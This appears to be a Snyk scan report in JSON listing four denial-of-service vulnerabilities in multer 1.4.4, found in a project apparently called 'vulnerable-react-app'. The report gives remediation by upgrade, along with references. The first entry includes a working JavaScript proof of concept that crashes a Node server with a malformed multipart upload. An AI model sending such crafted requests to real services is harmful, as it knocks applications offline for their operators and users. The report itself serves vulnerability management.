[
  {
    "id": "SNYK-JS-MULTER-10185673",
    "title": "Uncaught Exception",
    "severity": "high",
    "packageName": "multer",
    "version": "1.4.4",
    "nearestFixedInVersion": null,
    "isUpgradable": true,
    "isPatchable": false,
    "upgradePath": [
      false,
      "multer@2.0.0"
    ],
    "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception due to an `error` event thrown by `busboy`. An attacker can cause a full nodejs application to crash by sending a specially crafted multi-part upload request.\n## PoC\n```javascript\r\nconst express = require('express')\r\nconst multer  = require('multer')\r\nconst http  = require('http')\r\nconst upload = multer({ dest: 'uploads/' })\r\nconst port = 8888\r\n\r\nconst app = express()\r\n\r\napp.post('/upload', upload.single('file'), function (req, res) {\r\n  res.send({})\r\n})\r\n\r\napp.listen(port, () => {\r\n  console.log(`Listening on port ${port}`)\r\n\r\n  const boundary = 'AaB03x'\r\n  const body = [\r\n    '--' + boundary,\r\n    'Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"',\r\n    'Content-Type: text/plain',\r\n    '',\r\n    'test without end boundary'\r\n  ].join('\\r\\n')\r\n  const options = {\r\n    hostname: 'localhost',\r\n    port,\r\n    path: '/upload',\r\n    method: 'POST',\r\n    headers: {\r\n      'content-type': 'multipart/form-data; boundary=' + boundary,\r\n      'content-length': body.length,\r\n    }\r\n  }\r\n  const req = http.request(options, (res) => {\r\n    console.log(res.statusCode)\r\n  })\r\n  req.on('error', (err) => {\r\n    console.error(err)\r\n  })\r\n  req.write(body)\r\n  req.end()\r\n})\r\n```\n## Remediation\nUpgrade `multer` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)\n- [GitHub Issue](https://github.com/expressjs/multer/issues/1176)\n",
    "references": [
      {
        "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
        "title": "GitHub Commit"
      },
      {
        "url": "https://github.com/expressjs/multer/issues/1176",
        "title": "GitHub Issue"
      }
    ],
    "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
    "from": [
      "vulnerable-react-app@1.0.0",
      "multer@1.4.4"
    ]
  },
  {
    "id": "SNYK-JS-MULTER-10185675",
    "title": "Missing Release of Memory after Effective Lifetime",
    "severity": "high",
    "packageName": "multer",
    "version": "1.4.4",
    "nearestFixedInVersion": null,
    "isUpgradable": true,
    "isPatchable": false,
    "upgradePath": [
      false,
      "multer@2.0.0"
    ],
    "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Memory after Effective Lifetime due to improper handling of error events in HTTP request streams, which fails to close the internal `busboy` stream. An attacker can cause a denial of service by repeatedly triggering errors in file upload streams, leading to resource exhaustion and memory leaks.\r\n\r\n**Note:**\r\n\r\nThis is only exploitable if the server is handling file uploads.\n## Remediation\nUpgrade `multer` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)\n- [GitHub PR](https://github.com/expressjs/multer/pull/1120)\n",
    "references": [
      {
        "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
        "title": "GitHub Commit"
      },
      {
        "url": "https://github.com/expressjs/multer/pull/1120",
        "title": "GitHub PR"
      }
    ],
    "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
    "from": [
      "vulnerable-react-app@1.0.0",
      "multer@1.4.4"
    ]
  },
  {
    "id": "SNYK-JS-MULTER-10299078",
    "title": "Uncaught Exception",
    "severity": "critical",
    "packageName": "multer",
    "version": "1.4.4",
    "nearestFixedInVersion": null,
    "isUpgradable": true,
    "isPatchable": false,
    "upgradePath": [
      false,
      "multer@2.0.1"
    ],
    "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception in `makeMiddleware`, when processing a file upload request. An attacker can cause the application to crash by sending a request with a field name containing an empty string.\n## Remediation\nUpgrade `multer` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9)\n- [GitHub Issue](https://github.com/expressjs/multer/issues/1233)\n- [GitHub PR](https://github.com/expressjs/multer/pull/1256)\n",
    "references": [
      {
        "url": "https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9",
        "title": "GitHub Commit"
      },
      {
        "url": "https://github.com/expressjs/multer/issues/1233",
        "title": "GitHub Issue"
      },
      {
        "url": "https://github.com/expressjs/multer/pull/1256",
        "title": "GitHub PR"
      }
    ],
    "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H",
    "from": [
      "vulnerable-react-app@1.0.0",
      "multer@1.4.4"
    ]
  },
  {
    "id": "SNYK-JS-MULTER-10773732",
    "title": "Uncaught Exception",
    "severity": "high",
    "packageName": "multer",
    "version": "1.4.4",
    "nearestFixedInVersion": null,
    "isUpgradable": true,
    "isPatchable": false,
    "upgradePath": [
      false,
      "multer@2.0.2"
    ],
    "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception due to improper handling of multipart requests. An attacker can cause the application to crash by sending a specially crafted malformed multi-part upload request that triggers an unhandled exception.\n## Remediation\nUpgrade `multer` to version 2.0.2 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b)\n- [OpenJS Advisories](https://cna.openjsf.org/security-advisories.html)\n- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2381726)\n",
    "references": [
      {
        "url": "https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b",
        "title": "GitHub Commit"
      },
      {
        "url": "https://cna.openjsf.org/security-advisories.html",
        "title": "OpenJS Advisories"
      },
      {
        "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2381726",
        "title": "Red Hat Bugzilla Bug"
      }
    ],
    "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
    "from": [
      "vulnerable-react-app@1.0.0",
      "multer@1.4.4"
    ]
  }
]
